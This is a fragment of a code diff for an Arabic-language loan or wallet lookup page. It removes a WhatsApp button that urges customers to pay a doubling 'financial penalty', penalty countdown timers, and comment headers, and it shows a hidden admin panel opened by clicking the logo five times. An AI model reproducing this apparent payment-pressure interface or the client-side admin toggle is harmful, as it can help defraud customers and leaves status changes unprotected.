-      <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 دفع الغرامة المالية\\n\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ المدفوع: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n🔒 الجدارة المحجوزة: ${proofAmount.toLocaleString('ar-EG')} ج.م\\n⚠️ الغرامة المالية: ${penalty.toLocaleString('ar-EG')} ج.م\\n\\nأرجو دفع الغرامة المالية لتجنب تضاعفها.')">
-        <i class="fab fa-whatsapp"></i> 📞 تواصل لدفع الغرامة المالية
-      </button>
-
-      <div class="client-info" style="margin-top:0.6rem;">
-        <div class="row"><span class="k">👤 الاسم</span><span class="v">${customer.name}</span></div>
-        <div class="row"><span class="k">🔢 الرقم القومي</span><span class="v gold">${currentNationalId}</span></div>
-        <div class="row"><span class="k">💼 الوظيفة</span><span class="v">${customer.job || 'غير مسجل'}</span></div>
-        <div class="row"><span class="k">📱 المحفظة</span><span class="v gold">${customer.wallet || 'غير محدد'}</span></div>
-        <div class="row"><span class="k">🔢 رقم المحفظة</span><span class="v">${customer.walletNum || 'سيتم تسجيله'}</span></div>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  المؤقتات
-  // ================================================================
   function startPendingTimer() {
     if (pendingTimerInterval) clearInterval(pendingTimerInterval);
     const pendingTimer = document.getElementById('pendingTimer');
@@ -1794,50 +1338,6 @@
         const m = Math.floor(seconds / 60);
         const s = seconds % 60;
         pendingTimer.innerText = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      }, 1000);
-    }
-  }
-
-  function startOnePmTimer() {
-    if (pendingTimerInterval) clearInterval(pendingTimerInterval);
-    const pendingTimer = document.getElementById('pendingTimer');
-    if (pendingTimer) {
-      const now = new Date();
-      const onePm = new Date();
-      onePm.setHours(13, 0, 0, 0);
-      if (onePm <= now) onePm.setDate(onePm.getDate() + 1);
-      let seconds = Math.floor((onePm - now) / 1000);
-      const render = () => {
-        const h = Math.floor(seconds / 3600);
-        const m = Math.floor((seconds % 3600) / 60);
-        const s = seconds % 60;
-        pendingTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      };
-      render();
-      pendingTimerInterval = setInterval(() => {
-        if (seconds <= 0) { clearInterval(pendingTimerInterval); pendingTimer.innerText = "00:00:00"; return; }
-        seconds--;
-        render();
-      }, 1000);
-    }
-  }
-
-  function startPenaltyTimer() {
-    if (pendingTimerInterval) clearInterval(pendingTimerInterval);
-    const penaltyTimer = document.getElementById('penaltyTimer');
-    if (penaltyTimer) {
-      let seconds = 8 * 60 * 60;
-      const render = () => {
-        const h = Math.floor(seconds / 3600);
-        const m = Math.floor((seconds % 3600) / 60);
-        const s = seconds % 60;
-        penaltyTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      };
-      render();
-      pendingTimerInterval = setInterval(() => {
-        if (seconds <= 0) { clearInterval(pendingTimerInterval); penaltyTimer.innerText = "00:00:00"; return; }
-        seconds--;
-        render();
       }, 1000);
     }
   }
@@ -1859,9 +1359,6 @@
     }
   }
 
-  // ================================================================
-  //  الأزرار
-  // ================================================================
   function bindButtons(customer) {
     const proofBtn = document.getElementById('proofBtn');
     if (proofBtn) {
@@ -1894,9 +1391,6 @@
     }
   }
 
-  // ================================================================
-  //  البحث
-  // ================================================================
   function searchCustomer() {
     const nationalId = document.getElementById('nationalId').value.trim();
     if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
@@ -1919,9 +1413,6 @@
     }, 600);
   }
 
-  // ================================================================
-  //  الأدمن
-  // ================================================================
   function toggleAdmin() {
     isAdmin = !isAdmin;
     document.getElementById('adminPanel').classList.toggle('show', isAdmin);
@@ -1942,9 +1433,6 @@
     alert(`✅ تم تغيير الحالة إلى "${statusLabels[newStatus] || newStatus}" بنجاح.`);
   }
 
-  // ================================================================
-  //  الأحداث
-  // ================================================================
   document.querySelector('.brand')?.addEventListener('click', function() {
     adminClickCount++;
     if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
